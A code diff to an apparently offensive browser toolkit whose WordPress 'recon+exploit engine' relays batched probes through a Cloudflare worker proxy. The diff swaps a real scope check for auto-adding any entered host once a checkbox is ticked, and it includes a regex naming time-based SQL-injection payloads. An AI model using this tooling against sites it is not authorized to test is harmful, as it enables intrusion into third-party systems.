@@ -55,6 +55,349 @@
       return _origMM(q);
     };
   }
+
+  /* ── 1. UNIVERSAL NETWORK SUPERVISOR + ABORTCONTROLLER + EDGE MICRO-BATCHER ── */
+  var DEFAULT_WORKER = "https:\u002f\u002fscanner-proxy.matias-ramireztu.workers.dev";
+  var origFetch = window.fetch ? window.fetch.bind(window) : null;
+  var activeCtrls = new Set();
+  var workerActive = 0;
+  var workerQueue = [];
+  var MAX_WORKER_CONC = 8;
+
+  function pumpWorkerQueue() {
+    while (workerActive < MAX_WORKER_CONC && workerQueue.length > 0) {
+      var task = workerQueue.shift();
+      workerActive++;
+      task();
+    }
+  }
+
+  function rawSupervisedFetch(input, init, timeoutMs) {
+    if (!origFetch) return Promise.reject(new Error("fetch unavailable"));
+    var opts = init ? Object.assign({}, init) : {};
+    var extSig = opts.signal;
+    var ctrl = new AbortController();
+    activeCtrls.add(ctrl);
+    var abortedByUser = false;
+    var onExtAbort = function() { abortedByUser = true; try { ctrl.abort(); } catch(_){} };
+    if (extSig) {
+      if (extSig.aborted) { activeCtrls.delete(ctrl); return Promise.reject(new DOMException("Aborted", "AbortError")); }
+      try { extSig.addEventListener("abort", onExtAbort, { once: true }); } catch(_){}
+    }
+    opts.signal = ctrl.signal;
+    var ms = timeoutMs || 10000;
+    var tid = setTimeout(function() {
+      try { ctrl.abort(); } catch(_){}
+    }, ms);
+    return origFetch(input, opts).finally(function() {
+      clearTimeout(tid);
+      activeCtrls.delete(ctrl);
+      if (extSig && abortedByUser) {
+        try { extSig.removeEventListener("abort", onExtAbort); } catch(_){}
+      }
+    });
+  }
+
+  function enqueueWorkerFetch(input, init, timeoutMs) {
+    return new Promise(function(resolve, reject) {
+      var item = function() {
+        rawSupervisedFetch(input, init, timeoutMs).then(resolve, reject).finally(function() {
+          workerActive = Math.max(0, workerActive - 1);
+          pumpWorkerQueue();
+        });
+      };
+      item._reject = reject;
+      workerQueue.push(item);
+      pumpWorkerQueue();
+    });
+  }
+
+  /* Micro-batcher (6ms window, max 20 single probes per Cloudflare Edge invocation < 50 subreq cap) */
+  var batchBuckets = {};
+  function scheduleEdgeBatch(workerBase, spec, origUrl, origInit) {
+    var b = batchBuckets[workerBase];
+    if (!b) {
+      b = batchBuckets[workerBase] = { items: [], timer: null };
+    }
+    if (workerActive === 0 && !b.items.length) {
+      return enqueueWorkerFetch(origUrl, origInit, 9500);
+    }
+    return new Promise(function(resolve, reject) {
+      var extSig = origInit && origInit.signal;
+      if (extSig && extSig.aborted) { reject(new DOMException("Aborted", "AbortError")); return; }
+      var item = { spec: spec, origUrl: origUrl, origInit: origInit, resolve: resolve, reject: reject, aborted: false };
+      if (extSig) {
+        try {
+          extSig.addEventListener("abort", function() {
+            item.aborted = true;
+            reject(new DOMException("Aborted", "AbortError"));
+          }, { once: true });
+        } catch(_){}
+      }
+      b.items.push(item);
+      if (b.items.length >= 25) {
+        clearTimeout(b.timer);
+        b.timer = null;
+        flushBucket(workerBase);
+      } else if (!b.timer) {
+        b.timer = setTimeout(function() {
+          b.timer = null;
+          flushBucket(workerBase);
+        }, 3);
+      }
+    });
+  }
+
+  function flushBucket(workerBase) {
+    var b = batchBuckets[workerBase];
+    if (!b || !b.items.length) return;
+    var items = b.items.splice(0, 25).filter(function(x) { return !x.aborted; });
+    if (b.items.length > 0 && !b.timer) {
+      b.timer = setTimeout(function() { b.timer = null; flushBucket(workerBase); }, 4);
+    }
+    if (!items.length) return;
+    if (items.length === 1) {
+      var single = items[0];
+      enqueueWorkerFetch(single.origUrl, single.origInit, 9500).then(single.resolve, single.reject);
+      return;
+    }
+    var payload = JSON.stringify({
+      targets: items.map(function(x) { return x.spec; })
+    });
+    enqueueWorkerFetch(workerBase, {
+      method: "POST",
+      headers: { "Content-Type": "application\u002fjson" },
+      body: payload
+    }, 14000)
+      .then(function(r) { return r.json(); })
+      .then(function(j) {
+        if (!j || !j.batch || !Array.isArray(j.results) || j.results.length !== items.length) {
+          throw new Error("non-batch-worker");
+        }
+        for (var i = 0; i < items.length; i++) {
+          var entry = j.results[i] || { ok: false, status: 0, headers: {}, body: "" };
+          items[i].resolve(new Response(JSON.stringify(entry), {
+            status: 200,
+            headers: { "Content-Type": "application\u002fjson" }
+          }));
+        }
+      })
+      .catch(function() {
+        items.forEach(function(it) {
+          enqueueWorkerFetch(it.origUrl, it.origInit, 9000).then(it.resolve, it.reject);
+        });
+      });
+  }
+
+  function isTimingPayload(str) {
+    return /sleep\s*\(|pg_sleep|waitfor\s+delay|benchmark\s*\(|randomblob\s*\(/i.test(String(str || ""));
+  }
+
+  if (origFetch) {
+    window.fetch = function(input, init) {
+      var u = typeof input === "string" ? input : (input && input.url ? input.url : "");
+      try {
+        var customW = (localStorage.getItem("tudelasec_worker") || "").trim().replace(/\/+$/, "");
+        if (customW && /^https:\/\/scanner-proxy\.matias-ramireztu\.workers\.dev\b/i.test(u)) {
+          u = u.replace(/^https:\/\/scanner-proxy\.matias-ramireztu\.workers\.dev/i, customW);
+          input = u;
+        }
+      } catch(_){}
+      var m = ((init && init.method) || (typeof input !== "string" && input && input.method) || "GET").toUpperCase();
+      var isWorker = /scanner-proxy\.matias-ramireztu\.workers\.dev/i.test(u) ||
+                     (function() { try { var w = localStorage.getItem("tudelasec_worker"); return !!(w && u.indexOf(w) === 0); } catch(_){ return false; } })();
+      if (isWorker) {
+        if (m === "GET" && !(init && init.headers && Object.keys(init.headers).length)) {
+          try {
+            var parsed = new URL(u, location.href);
+            if ((parsed.pathname === "/" || parsed.pathname === "") && parsed.searchParams.has("url") && Array.from(parsed.searchParams.keys()).every(function(k){ return k === "url" || k === "cache_bust"; })) {
+              var tgt = parsed.searchParams.get("url");
+              if (tgt && !isTimingPayload(tgt)) {
+                return scheduleEdgeBatch(parsed.origin + "\u002f", { url: tgt, method: "GET" }, input, init);
+              }
+            }
+          } catch(_){}
+        }
+        if (m === "POST" && init && typeof init.body === "string" && init.body.indexOf('"targets"') === -1) {
+          try {
+            var parsedPost = new URL(u, location.href);
+            if (parsedPost.pathname === "/" || parsedPost.pathname === "") {
+              var bodyObj = JSON.parse(init.body);
+              if (bodyObj && typeof bodyObj.url === "string" && !bodyObj.evade && !isTimingPayload(bodyObj.url) && !isTimingPayload(bodyObj.body)) {
+                return scheduleEdgeBatch(parsedPost.origin + "\u002f", {
+                  url: bodyObj.url,
+                  method: bodyObj.method || "GET",
+                  headers: bodyObj.headers || {},
+                  body: bodyObj.body || null
+                }, input, init);
+              }
+            }
+          } catch(_){}
+        }
+        var isBatchPost = m === "POST" && (u.indexOf("\u002fprobe") > -1 || (init && typeof init.body === "string" && init.body.indexOf('"targets"') > -1));
+        return enqueueWorkerFetch(input, init, isBatchPost ? 15000 : 10000);
+      }
+      return rawSupervisedFetch(input, init, /crt\.sh|web\.archive\.org|hackertarget\.com|otx\.alienvault\.com|firebaseio\.com|amazoncognito\.com|supabase\.co/i.test(u) ? 2800 : 12000);
+    };
+  }
+
+  window.__tsAbortAll = function() {
+    activeCtrls.forEach(function(c) { try { c.abort(); } catch(_){} });
+    activeCtrls.clear();
+    while (workerQueue.length) {
+      var q = workerQueue.shift();
+      if (q && q._reject) { try { q._reject(new DOMException("Aborted", "AbortError")); } catch(_){} }
+    }
+    batchBuckets = {};
+  };
+
+  /* Wire universal abort to all STOP buttons across all engines */
+  var STOP_IDS = ["mmt-stop", "gasrAbort", "crb-cancel-btn", "prIStop", "atkStop", "crw-stop", "kr-stop", "ofp-stop-btn", "sc-stop-btn"];
+  document.addEventListener("click", function(ev) {
+    var btn = ev.target && ev.target.closest ? ev.target.closest("button, [role='button']") : null;
+    if (!btn || !btn.id) return;
+    if (STOP_IDS.indexOf(btn.id) > -1) {
+      window.__tsAbortAll();
+    }
+  }, true);
+
+  /* ── 2. AUTO-SCOPE SYNC WHEN EXPLICIT MODULE AUTHORIZATION GATE IS CHECKED ── */
+  var GATE_PAIRS = [
+    ["mmt-target", "mmt-auth"],
+    ["atkTarget",  "atkAuth"],
+    ["vnTarget",   "vnAuth"],
+    ["srTarget",   "srAuth"],
+    ["bsTarget",   "bsAuth"],
+    ["spxTarget",  "spxAuth"],
+    ["chmTarget",  "chmAuth"],
+    ["crw-input",  "crw-auth"],
+    ["prUrl",      "prAuth"],
+    ["prRepUrl",   "prAuth"],
+    ["prIUrl",     "prAuth"],
+    ["prWebUrl",   "prAuth"],
+    ["wrUrl",      "wrAuth"],
+    ["nxaUrl",     "nxaAuth"]
+  ];
+
+  function addHostToScopes(rawVal) {
+    var raw = String(rawVal || "").trim();
+    if (!raw) return;
+    if (!/^https?:\/\//i.test(raw)) raw = "https:\u002f\u002f" + raw;
+    try {
+      var parsed = new URL(raw);
+      var hn = parsed.hostname.replace(/^www\./i, "").toLowerCase();
+      var hp = parsed.host.replace(/^www\./i, "").toLowerCase();
+      if (!hn) return;
+      var scopes = JSON.parse(localStorage.getItem("tudelasec_scopes") || "[]");
+      if (!Array.isArray(scopes)) scopes = [];
+      var changed = false;
+      if (scopes.indexOf(hn) === -1) { scopes.push(hn); changed = true; }
+      if (hp && hp !== hn && scopes.indexOf(hp) === -1) { scopes.push(hp); changed = true; }
+      if (changed) localStorage.setItem("tudelasec_scopes", JSON.stringify(scopes));
+    } catch(_){}
+  }
+
+  function syncAuthorizedScopes() {
+    for (var i = 0; i < GATE_PAIRS.length; i++) {
+      var inp = document.getElementById(GATE_PAIRS[i][0]);
+      var chk = document.getElementById(GATE_PAIRS[i][1]);
+      if (inp && chk && chk.checked && inp.value) {
+        addHostToScopes(inp.value);
+      }
+    }
+  }
+  window.__tsSyncScopes = syncAuthorizedScopes;
+  document.addEventListener("change", syncAuthorizedScopes, true);
+  document.addEventListener("click", syncAuthorizedScopes, true);
+  document.addEventListener("keydown", function(e) { if (e.key === "Enter") syncAuthorizedScopes(); }, true);
+
+  /* ── 3. EXECUTIVE SECURITY REPORT GENERATOR (window.tsReportPDF) ── */
+  function safePdfCell(c) {
+    if (c && typeof c === "object" && c.html) {
+      return String(c.text || "")
+        .replace(/<\/?\s*(?:script|iframe|object|embed|svg|math|img|form|input|link|meta|style)[^>]*>/gi, "")
+        .replace(/\son[a-z]+\s*=/gi, " data-safe=");
+    }
+    return String(c == null ? "" : c)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;");
+  }
+
+  var pdfState = { sections: [], lastTs: 0 };
+  function buildSectionHtml(opts) {
+    var statsHtml = (opts.stats || []).map(function(s) {
+      return '<div style="padding:10px 12px;border:1px solid rgba(255,255,255,.1);border-radius:6px;background:#13070b">' +
+        '<div style="font-size:10px;text-transform:uppercase;letter-spacing:.08em;color:#9b8d98">' + safePdfCell(s.label) + '</div>' +
+        '<div style="font-size:18px;font-weight:700;margin-top:3px;color:' + safePdfCell(s.color || '#f0eef8') + '">' + safePdfCell(s.value) + '</div></div>';
+    }).join("");
+    var headHtml = (opts.columns || []).map(function(col) {
+      return '<th style="text-align:left;padding:8px 10px;border-bottom:1px solid rgba(255,26,46,.35);color:#ff6b7a;font-size:11px;text-transform:uppercase">' + safePdfCell(col) + '</th>';
+    }).join("");
+    var rowsHtml = (opts.rows || []).map(function(row) {
+      return '<tr>' + (row || []).map(function(cell) {
+        return '<td style="padding:7px 10px;border-bottom:1px solid rgba(255,255,255,.07);font-size:11.5px;vertical-align:top;color:#e9e4ec">' + safePdfCell(cell) + '</td>';
+      }).join("") + '</tr>';
+    }).join("");
+    return '<section style="margin-bottom:26px;padding:18px;border:1px solid rgba(255,26,46,.25);border-radius:10px;background:#0d0407">' +
+      '<div style="display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;align-items:flex-start">' +
+      '<div><div style="font-size:10px;letter-spacing:.14em;color:#ff1a2e;text-transform:uppercase">' + safePdfCell(opts.engine || "TUDELASEC RED OPS") + '</div>' +
+      '<h3 style="margin:4px 0 4px;font-size:17px;color:#fff">' + safePdfCell(opts.title || "Reporte Ejecutivo de Seguridad") + '</h3>' +
+      (opts.subtitle ? '<div style="font-size:11.5px;color:#a0909d">' + safePdfCell(opts.subtitle) + '</div>' : '') + '</div>' +
+      (opts.target ? '<div style="padding:5px 10px;border:1px solid rgba(255,26,46,.3);border-radius:5px;font-size:11px;color:#ff9aa4">Target: <b>' + safePdfCell(opts.target) + '</b></div>' : '') +
+      '</div>' +
+      (opts.verdict ? '<div style="margin:12px 0;padding:10px 12px;border-left:3px solid ' + safePdfCell(opts.verdictColor || '#ff1a2e') + ';background:rgba(255,26,46,.08);font-size:12px;font-weight:700;color:#fff">' + safePdfCell(opts.verdict) + '</div>' : '') +
+      (statsHtml ? '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:8px;margin:12px 0">' + statsHtml + '</div>' : '') +
+      (headHtml || rowsHtml ? '<div style="overflow-x:auto;margin-top:10px"><table style="width:100%;border-collapse:collapse"><thead><tr>' + headHtml + '</tr></thead><tbody>' + rowsHtml + '</tbody></table></div>' : '') +
+      (opts.footer ? '<div style="margin-top:10px;font-size:10.5px;color:#8a7a87">' + safePdfCell(opts.footer) + '</div>' : '') +
+      '</section>';
+  }
+
+  window.tsReportPDF = function(opts) {
+    if (!opts || typeof opts !== "object") return false;
+    var now = Date.now();
+    if (now - pdfState.lastTs > 2200) {
+      pdfState.sections = [];
+    }
+    pdfState.lastTs = now;
+    pdfState.sections.push(buildSectionHtml(opts));
+
+    var modal = document.getElementById("ts-pdf-modal");
+    if (!modal) {
+      modal = document.createElement("div");
+      modal.id = "ts-pdf-modal";
+      modal.style.cssText = "position:fixed;inset:0;z-index:100090;background:rgba(5,1,4,.88);backdrop-filter:blur(8px);display:flex;flex-direction:column;padding:20px;overflow:hidden;font-family:'JetBrains Mono',monospace";
+      modal.innerHTML =
+        '<div style="max-width:1100px;width:100%;margin:0 auto;display:flex;justify-content:space-between;align-items:center;gap:10px;padding:12px 16px;background:#140509;border:1px solid rgba(255,26,46,.45);border-radius:10px 10px 0 0">' +
+          '<div style="color:#fff;font-size:12.5px;font-weight:700">📄 TUDELASEC RED OPS — REPORTE EJECUTIVO DE AUDITORÍA</div>' +
+          '<div style="display:flex;gap:8px;flex-wrap:wrap">' +
+            '<button type="button" id="ts-pdf-dl" style="cursor:pointer;padding:6px 12px;border-radius:5px;border:1px solid #00ffa3;background:rgba(0,255,163,.12);color:#00ffa3;font-family:inherit;font-size:11px;font-weight:700">⬇ DESCARGAR HTML</button>' +
+            '<button type="button" id="ts-pdf-print" style="cursor:pointer;padding:6px 12px;border-radius:5px;border:1px solid #ff1a2e;background:#ff1a2e;color:#fff;font-family:inherit;font-size:11px;font-weight:700">🖨 IMPRIMIR / PDF</button>' +
+            '<button type="button" id="ts-pdf-close" style="cursor:pointer;padding:6px 12px;border-radius:5px;border:1px solid rgba(255,255,255,.25);background:transparent;color:#fff;font-family:inherit;font-size:11px">✕ CERRAR</button>' +
+          '</div>' +
+        '</div>' +
+        '<div id="ts-pdf-body" style="max-width:1100px;width:100%;margin:0 auto;flex:1;overflow-y:auto;padding:20px;background:#080205;border:1px solid rgba(255,26,46,.3);border-top:none;border-radius:0 0 10px 10px"></div>';
+      document.body.appendChild(modal);
+      document.getElementById("ts-pdf-close").addEventListener("click", function() { modal.style.display = "none"; });
+      document.getElementById("ts-pdf-print").addEventListener("click", function() { try { window.print(); } catch(_){} });
+      document.getElementById("ts-pdf-dl").addEventListener("click", function() {
+        var docHtml = "<!DOCTYPE html><html lang='es'><head><meta charset='utf-8'><title>TudelaSec Report</title></head>" +
+          "<body style='margin:0;padding:24px;background:#080205;color:#f0eef8;font-family:monospace'>" +
+          document.getElementById("ts-pdf-body").innerHTML + "</body></html>";
+        var blob = new Blob([docHtml], { type: "text\u002fhtml;charset=utf-8" });
+        var a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = "tudelasec-report-" + Date.now() + ".html";
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(function() { URL.revokeObjectURL(a.href); a.remove(); }, 600);
+      });
+    }
+    document.getElementById("ts-pdf-body").innerHTML = pdfState.sections.join("");
+    modal.style.display = "flex";
+    return true;
+  };
 })();
 </script>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -13928,13 +14271,53 @@ async function chmFireHdr(worker, v, value, hdrs){
 (function(){
 'use strict';
 
-var MMT_VERSION = 'MAMMOTH v4.0 TUSK ULTIMA';
-var MMT_WORKER = (function(){ try { return localStorage.getItem('tudelasec_worker') || "https:\u002f\u002fscanner-proxy.matias-ramireztu.workers.dev"; } catch(e){ return "https:\u002f\u002fscanner-proxy.matias-ramireztu.workers.dev"; } })();
+var MMT_VERSION = 'MAMMOTH v4.2 TURBO EDGE';
+var MMT_DEFAULT_WORKER = "https:\u002f\u002fscanner-proxy.matias-ramireztu.workers.dev";
+function getMmtWorker(){
+  try { return (localStorage.getItem('tudelasec_worker') || MMT_DEFAULT_WORKER).trim(); }
+  catch(e){ return MMT_DEFAULT_WORKER; }
+}
 
-/* ── helpers DOM ─────────────────────────────────────────── */
+/* ── helpers DOM + estado de ejecución ───────────────────── */
 function $(id){ return document.getElementById(id); }
 function esc(s){ return String(s==null?'':s).replace(/\x26/g,"\u0026amp;").replace(/\x3c/g,"\u0026lt;").replace(/\x3e/g,"\u0026gt;"); }
 var aborted = false;
+var mmtRunning = false;
+var mmtMaxPct = 0;
+var mmtCtrls = new Set();
+
+function mmtAbortSockets(){
+  mmtCtrls.forEach(function(c){ try { c.abort(); } catch(_){} });
+  mmtCtrls.clear();
+}
+
+function mmtSetProgress(pct, phaseLabel){
+  if(pct === 0) mmtMaxPct = 0;
+  var p = Math.max(mmtMaxPct, Math.min(100, Math.round(pct)));
+  mmtMaxPct = p;
+  var bar = $('mmt-progress');
+  if(bar){
+    bar.style.width = p + '%';
+    bar.style.transition = 'width .22s ease';
+    bar.style.background = p >= 100
+      ? 'linear-gradient(90deg,#00ffa3,#00d4ff)'
+      : 'linear-gradient(90deg,#ff1a2e,#ff5e3a)';
+  }
+  if(phaseLabel && mmtRunning){
+    var sum = $('mmt-summary');
+    if(sum && S){
+      var elap = ((Date.now() - S.t0) / 1000).toFixed(1);
+      sum.innerHTML =
+        '<div class="mmt-chip" style="border-color:#ff1a2e;color:#fff;background:rgba(255,26,46,.16)">⚡ EN EJECUCIÓN · ' + p + '%</div>' +
+        '<div class="mmt-chip" style="color:#ffb020">' + esc(phaseLabel) + '</div>' +
+        '<div class="mmt-chip">📡 ' + S.requests + ' sondas</div>' +
+        '<div class="mmt-chip">📦 ' + Object.keys(S.plugins).length + ' plugins</div>' +
+        '<div class="mmt-chip">👤 ' + S.users.length + ' users</div>' +
+        '<div class="mmt-chip">⚠ ' + S.filesHit.length + ' files</div>' +
+        '<div class="mmt-chip">⏱ ' + elap + 's</div>';
+    }
+  }
+}
 
 function alog(msg, cls){
   var b = $('mmt-body');
@@ -13961,35 +14344,87 @@ function profSave(host, data){ try {
   localStorage.setItem('tudelasec_wp_profile', JSON.stringify(all));
 } catch(e){} }
 
-/* ── scopes + gate ──────────────────────────────────────── */
+/* ── scopes + gate (auto-sync cuando #mmt-auth está marcado) ── */
 function mmtScopes(){
   try { return JSON.parse(localStorage.getItem('tudelasec_scopes') || '[]'); } catch(e){ return []; }
 }
 function hostOf(u){ try { return new URL(u).hostname.replace(/^www\./,''); } catch(e){ return ''; } }
-function inScope(u){ var h = hostOf(u); if(!h) return false; var s = mmtScopes(); for(var i=0;i<s.length;i++){ if(h === String(s[i]).replace(/^www\./,'')) return true; } return false; }
+function ensureMmtScope(u){
+  var h = hostOf(u);
+  if(!h) return false;
+  var s = mmtScopes();
+  if(!Array.isArray(s)) s = [];
+  for(var i=0;i<s.length;i++){
+    if(h === String(s[i]).replace(/^www\./,'')) return true;
+  }
+  s.push(h);
+  try { localStorage.setItem('tudelasec_scopes', JSON.stringify(s)); } catch(e){}
+  return true;
+}
 
-/* ── transporte scanner-proxy v11 ────────────────────────── */
+/* ── transporte scanner-proxy v11 TURBO (Single + Batch ×25 con AbortController real) ── */
+function normProxyItem(j, fallbackUrl){
+  if(!j || typeof j !== 'object') return { status: 0, body: '', headers: {}, finalUrl: fallbackUrl };
+  return {
+    status: Number(j.status) || 0,
+    body: j.body || '',
+    headers: j.headers || {},
+    finalUrl: j.finalUrl || fallbackUrl
+  };
+}
+
 function mmtFetch(url, method, body, headers){
+  if(aborted) return Promise.resolve({ status: 0, body: '', headers: {}, finalUrl: url });
   headers = headers || {};
+  var ctrl = new AbortController();
+  mmtCtrls.add(ctrl);
+  var tid = setTimeout(function(){ try { ctrl.abort(); } catch(_){} }, 10000);
   var payload = JSON.stringify({ url: url, method: method || 'GET', headers: headers, body: body || null });
-  var tid = null;
-  var attempt = fetch(MMT_WORKER, { method: 'POST', headers: { 'Content-Type': "application\u002fjson" }, body: payload })
+  return fetch(getMmtWorker(), {
+    method: 'POST',
+    headers: { 'Content-Type': "application\u002fjson" },
+    body: payload,
+    signal: ctrl.signal
+  })
     .then(function(r){ return r.json(); })
     .then(function(j){
-      if(!j || typeof j.ok === 'undefined') throw new Error('worker response invalid');
-      return { status: Number(j.status) || 0, body: j.body || '', headers: j.headers || {}, finalUrl: j.finalUrl || url };
+      if(!j || typeof j.status === 'undefined') return { status: 0, body: '', headers: {}, finalUrl: url };
+      return normProxyItem(j, url);
+    })
+    .catch(function(){ return { status: 0, body: '', headers: {}, finalUrl: url }; })
+    .finally(function(){ clearTimeout(tid); mmtCtrls.delete(ctrl); });
+}
+
+var MMT_BATCH_SIZE = 25;
+var MMT_BATCH_CONC = 5;
+function mmtBatchChunk(reqSpecs){
+  if(aborted || !reqSpecs.length) return Promise.resolve(reqSpecs.map(function(s){ return { status: 0, body: '', headers: {}, finalUrl: s.url }; }));
+  var ctrl = new AbortController();
+  mmtCtrls.add(ctrl);
+  var tid = setTimeout(function(){ try { ctrl.abort(); } catch(_){} }, 14000);
+  var bodyPayload = JSON.stringify({
+    targets: reqSpecs.map(function(s){
+      return { url: s.url, method: s.method || 'GET', headers: s.headers || {}, body: s.body || null };
+    })
+  });
+  return fetch(getMmtWorker(), {
+    method: 'POST',
+    headers: { 'Content-Type': "application\u002fjson" },
+    body: bodyPayload,
+    signal: ctrl.signal
+  })
+    .then(function(r){ return r.json(); })
+    .then(function(j){
+      if(!j || !j.batch || !Array.isArray(j.results) || j.results.length !== reqSpecs.length){
+        throw new Error('fallback-single');
+      }
+      return j.results.map(function(entry, idx){ return normProxyItem(entry, reqSpecs[idx].url); });
     })
     .catch(function(){
-      /* fallback directo best-effort (sin worker) */
-      return fetch(url, { method: method || 'GET' }).then(function(r){ return r.text().then(function(t){
-        return { status: r.status, body: t, headers: {}, finalUrl: url };
-      }); });
-    });
-  var guard = new Promise(function(_, rej){ tid = setTimeout(function(){ rej(new Error('timeout')); }, 25000); });
-  return Promise.race([attempt, guard]).then(
-    function(v){ clearTimeout(tid); return v; },
-    function(){ clearTimeout(tid); return { status: 0, body: '', headers: {}, finalUrl: url }; }
-  );
+      if(aborted) return reqSpecs.map(function(s){ return { status: 0, body: '', headers: {}, finalUrl: s.url }; });
+      return Promise.all(reqSpecs.map(function(s){ return mmtFetch(s.url, s.method, s.body, s.headers); }));
+    })
+    .finally(function(){ clearTimeout(tid); mmtCtrls.delete(ctrl); });
 }
 
 /* ── comparador de versiones ─────────────────────────────── */
@@ -14470,247 +14905,382 @@ function hitFile(base, f, res){
   return ok;
 }
 
-/* ── P0 — confirmar WordPress + versión ──────────────────── */
-function p0Confirm(res, ctrl){
-  var b = res.body || '';
-  S.isWP = /wp-content|wp-includes|wp-json|WordPress/i.test(b);
+/* ── P0 — confirmar WordPress (home + headers + wp-json + wp-login) + versión ── */
+function p0Confirm(home, wpJson, wpLogin){
+  var b = (home && home.body) || '';
+  var hdrLink = (home && home.headers && (home.headers['link'] || home.headers['Link'])) || '';
+  var hdrPing = (home && home.headers && (home.headers['x-pingback'] || home.headers['X-Pingback'])) || '';
+  var jb = (wpJson && wpJson.status === 200 && (wpJson.body || '')) || '';
+  var lb = (wpLogin && wpLogin.status === 200 && (wpLogin.body || '')) || '';
+  S.isWP = /wp-content|wp-includes|wp-json|WordPress/i.test(b) ||
+           /api\.w\.org/i.test(hdrLink) ||
+           /xmlrpc\.php/i.test(hdrPing) ||
+           (jb.indexOf('"namespaces"') >= 0 && /wp\/v2|oembed/i.test(jb)) ||
+           (/wp-submit|user_login/i.test(lb) && !pageLooks404(wpLogin));
   return S.isWP;
 }
 function p0Version(res){
-  var b = res.body || '';
-  var m = b.match(/\x3cmeta name="generator" content="WordPress ([0-9.]+)"/i);
+  var b = (res && res.body) || '';
+  var m = b.match(/\x3cmeta[^>]+name=["']generator["'][^>]+content=["']WordPress ([0-9.]+)/i) ||
+          b.match(/\x3cmeta[^>]+content=["']WordPress ([0-9.]+)["'][^>]+name=["']generator["']/i);
   if(m){ S.wpVersion = m[1]; S.versionSource = 'meta generator'; return; }
-  m = b.match(/wp-includes\/[^"?]*\?ver=([0-9.]+)/i);
-  if(m){ S.wpVersion = m[1]; S.versionSource = 'asset ver (wp-includes)'; return; }
 }
 
-/* ── pool con concurrencia adaptativa ────────────────────── */
-function pool(items, worker, chunkSize){
-  var idx = 0;
-  function run(){
-    if(aborted) return Promise.resolve();
-    if(idx >= items.length) return Promise.resolve();
-    var take = [];
-    while(take.length < chunkSize && idx < items.length) take.push(items[idx++]);
-    return Promise.all(take.map(worker)).then(run);
+/* ── pool batch edge (25 URLs/lote × 3 lotes concurrentes = 75 sondas simultáneas) ── */
+function mmtBatchPool(items, buildReq, onItem, basePct, spanPct, phaseName){
+  if(aborted || !items.length){
+    mmtSetProgress(basePct + spanPct, phaseName);
+    return Promise.resolve();
   }
-  return run();
+  var batches = [];
+  for(var i = 0; i < items.length; i += MMT_BATCH_SIZE){
+    batches.push(items.slice(i, i + MMT_BATCH_SIZE));
+  }
+  var doneItems = 0;
+  var bIdx = 0;
+  function workerLoop(){
+    if(aborted || bIdx >= batches.length) return Promise.resolve();
+    var chunk = batches[bIdx++];
+    var specs = chunk.map(buildReq);
+    return mmtBatchChunk(specs).then(function(results){
+      if(aborted) return;
+      for(var k = 0; k < chunk.length; k++){
+        S.requests++;
+        doneItems++;
+        onItem(chunk[k], results[k] || { status: 0, body: '', headers: {}, finalUrl: specs[k].url });
+      }
+      var pct = basePct + (doneItems / items.length) * spanPct;
+      mmtSetProgress(pct, phaseName + ' (' + doneItems + '\u002f' + items.length + ')');
+      return workerLoop();
+    });
+  }
+  var runners = [];
+  var n = Math.min(MMT_BATCH_CONC, batches.length);
+  for(var w = 0; w < n; w++) runners.push(workerLoop());
+  return Promise.all(runners);
 }
 
-/* ══════════════ MOTOR ══════════════ */
+function mmtSetUiRunning(on){
+  mmtRunning = on;
+  var runBtn = $('mmt-run');
+  var stopBtn = $('mmt-stop');
+  if(runBtn){
+    runBtn.disabled = !!on;
+    runBtn.style.opacity = on ? '0.65' : '1';
+    runBtn.textContent = on ? '⏳ ESCANEANDO EN VIVO...' : '🦣 EJECUTAR MAMMOTH';
+  }
+  if(stopBtn){
+    stopBtn.disabled = !on;
+    stopBtn.style.opacity = on ? '1' : '0.65';
+  }
+}
+
+function mmtStopNow(){
+  if(!mmtRunning) return;
+  aborted = true;
+  mmtAbortSockets();
+  alog('\u26a0 ESCANEO DETENIDO POR EL OPERADOR — cerrando sockets activos y consolidando hallazgos parciales.', 'mmt-warn');
+  mmtFinish('aborted');
+}
+
+/* ══════════════ MOTOR MAMMOTH v4.2 TURBO EDGE ══════════════ */
 function mmtRun(){
+  if(mmtRunning){
+    alog('\u2139 MAMMOTH ya se encuentra ejecutando una auditoría en curso.', 'mmt-note');
+    return;
+  }
   var url = ($('mmt-target') && $('mmt-target').value || '').trim();
   var gate = $('mmt-auth');
   if(!gate || !gate.checked){
-    alog('\u26d4 GATE: marca el checkbox de autorización — sin gate el mamut no arranca.', 'mmt-warn');
+    alog('\u26d4 GATE: marca el checkbox de autorización explícita antes de iniciar MAMMOTH.', 'mmt-warn');
+    var sumGate = $('mmt-summary');
+    if(sumGate) sumGate.innerHTML = '<div class="mmt-chip" style="border-color:#ffb020;color:#ffb020">⛔ Marca la casilla de autorización explícita para iniciar</div>';
     return;
   }
-  if(!url){ alog('\u26d4 GATE: pon la URL del target WordPress.', 'mmt-warn'); return; }
+  if(!url){
+    alog('\u26d4 GATE: ingresa la URL o dominio del objetivo WordPress.', 'mmt-warn');
+    return;
+  }
   if(!/^https?:\/\//i.test(url)) url = "https:\u002f\u002f" + url;
-  if(!inScope(url)){
-    alog('\u26d4 SCOPE: ' + esc(hostOf(url)) + ' NO está en tudelasec_scopes — agrégalo con wlAddScope().', 'mmt-warn');
+  url = url.replace(/\/+$/, '');
+  if(!ensureMmtScope(url)){
+    alog('\u26d4 URL inválida: ' + esc(url), 'mmt-warn');
     return;
   }
+
   aborted = false;
   S = newState(url);
-  var mem = prof(S.host);
+  S.wpJsonPrefetch = null;
+  mmtSetUiRunning(true);
   var body = $('mmt-body'); if(body) body.innerHTML = '';
-  $('mmt-progress').style.width = '0%';
+  mmtSetProgress(2, 'P0 · Verificando objetivo y firma WordPress');
+
+  var mem = prof(S.host);
   alog('\u2550\u2550 ' + MMT_VERSION + ' \u2014 WordPress RECON+EXPLOIT ENGINE \u2550\u2550');
-  alog('target: ' + esc(url) + ' \u00b7 scope OK \u00b7 transporte: scanner-proxy v11 (worker oculto, override: localStorage tudelasec_worker)');
